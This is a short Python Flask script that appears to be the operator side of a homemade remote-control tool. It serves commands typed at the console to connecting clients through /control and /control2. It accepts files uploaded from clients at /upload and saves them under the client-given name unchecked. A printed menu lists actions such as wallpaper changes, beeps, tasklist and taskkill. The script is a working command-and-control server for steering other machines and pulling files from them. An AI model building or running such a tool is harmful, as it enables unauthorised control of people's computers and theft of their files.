#How can you control multiple clients with one cmd window?

import threading
import time
import sys
from flask import Flask, jsonify, request

app = Flask(__name__)



@app.route('/')
def homepage():
	return '''
	<html>
		<head> </head>
		<body style="background-color: BLUE">
			%s
		</body>
	</html>
	''' % (
		'<h1 style="text-align: center; font-size:200px; color:GREEN; background-color: RED">DOR HAMOR</h1>' * 10000)
	
	
@app.route('/control', methods=['GET'])
def control():
	return input('Waiting for command: ')
	
	
@app.route('/upload', methods=['POST'])
def uploadFile():
	print('Recieving a file.')
	f = request.files['file']
	f.save(f.filename)
	print(f.filename)
	return f.filename
	
@app.route('/control2', methods=['POST'])
def control2():
	return input(request.data)



	
print('wallpaper/song/beep/tree/file/tasklist/taskkill')
app.run(host = '0.0.0.0')